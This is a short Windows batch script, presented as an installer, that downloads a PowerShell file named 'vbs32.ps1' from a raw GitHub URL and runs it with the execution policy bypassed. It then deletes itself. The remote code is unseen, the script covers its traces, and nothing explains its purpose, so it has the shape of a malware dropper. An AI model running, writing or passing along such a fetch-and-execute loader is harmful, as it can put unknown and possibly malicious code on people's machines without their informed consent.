cd /d "%~dp0"

echo Downloading installer from GitHub...
powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "& {(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/run-spec/auto/refs/heads/main/vbs32.ps1', 'installer.ps1')}"

if not exist "installer.ps1" (
    pause
    exit /b 1
)

powershell.exe -ExecutionPolicy Bypass -NoProfile -File "installer.ps1"

del "%~f0"
